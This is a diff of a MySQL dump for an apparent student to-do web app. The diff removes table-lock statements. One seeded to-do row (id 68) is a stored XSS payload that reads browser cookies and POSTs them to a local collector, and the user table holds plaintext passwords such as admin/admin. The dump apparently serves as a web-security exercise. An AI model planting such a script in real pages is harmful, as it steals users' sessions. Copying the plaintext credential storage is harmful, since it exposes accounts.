@@ -35,11 +35,11 @@ CREATE TABLE `project` (
 -- Dumping data for table `project`
 --
 
-LOCK TABLES `project` WRITE;
+
 /*!40000 ALTER TABLE `project` DISABLE KEYS */;
 INSERT INTO `project` VALUES (1,'Web2_Development',1),(2,'Web2_Projekt',4),(3,'Einkaufsliste',4),(4,'Shopping',4),(99,'public',99);
 /*!40000 ALTER TABLE `project` ENABLE KEYS */;
-UNLOCK TABLES;
+
 
 --
 -- Table structure for table `todo`
@@ -62,7 +62,7 @@ CREATE TABLE `todo` (
 -- Dumping data for table `todo`
 --
 
-LOCK TABLES `todo` WRITE;
+
 /*!40000 ALTER TABLE `todo` DISABLE KEYS */;
 INSERT INTO `todo` VALUES 
 (1,'Build a Flask app','2024-05-01 00:00:00',1,NULL),
@@ -85,7 +85,7 @@ INSERT INTO `todo` VALUES
 (67,'lol',NULL,3,NULL),
 (68,'<script>cookies=document.cookie;fetch(`http://127.0.0.1:8000`, {method: `POST`, mode: `no-cors`, headers: {\"Content-Type\": `application/json`},body: JSON.stringify({cookies: cookies})}).then(data => console.log(`Data sent`)).catch(error => console.error(`Error:`,error));</script>',NULL,99,NULL);
 /*!40000 ALTER TABLE `todo` ENABLE KEYS */;
-UNLOCK TABLES;
+
 
 --
 -- Table structure for table `user`
@@ -108,7 +108,7 @@ CREATE TABLE `user` (
 -- Dumping data for table `user`
 --
 
-LOCK TABLES `user` WRITE;
+
 /*!40000 ALTER TABLE `user` DISABLE KEYS */;
 INSERT INTO `user` VALUES 
 (1,'admin','admin','admin@admin.com'),
@@ -118,7 +118,6 @@ INSERT INTO `user` VALUES
 (99,'public','',''),
 (100,'test123','test123','test@test.com');
 /*!40000 ALTER TABLE `user` ENABLE KEYS */;
-UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
 
 /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
